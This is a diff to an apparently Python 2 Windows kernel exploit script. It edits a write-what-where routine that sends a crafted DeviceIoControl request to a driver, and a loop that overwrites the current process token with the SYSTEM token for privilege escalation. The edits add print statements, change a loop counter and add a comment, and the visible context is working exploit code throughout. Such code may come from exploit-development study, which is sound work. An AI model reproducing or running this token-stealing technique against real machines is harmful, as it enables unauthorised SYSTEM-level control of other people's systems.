@@ -210,7 +210,8 @@ def writeQWORD(driver, what=0x4141414141414141, where=0x4242424242424242):
 
     print "Value before DeviceIoControl: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
     triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
-    print "Value after: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
+    print "Our memory target is: " + str(hex(what_addr))
+    print "I wrote this to our memory target: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
     return triggerIOCTL
 
 ################################################### READ ###########################################################
@@ -368,7 +369,7 @@ def executeOverwrite():
 
         while True:
 
-            if counter > 2:
+            if counter > 1:
                 break
             counter+=1
 
@@ -384,7 +385,7 @@ def executeOverwrite():
 
             whatStr = str(hex(read_value))
             print "This is what in string format: " + whatStr
-            what = int((whatStr), 0)
+            what = int((whatStr), 0) #figure out the base for me - throws a fit if its base 10
             writeQWORD(driver, what, 0x000000001a002000)
             # Write the system_token over our current_token for SYSTEM privileges.
             print "MAIN Attempting system to current token overwrite!"
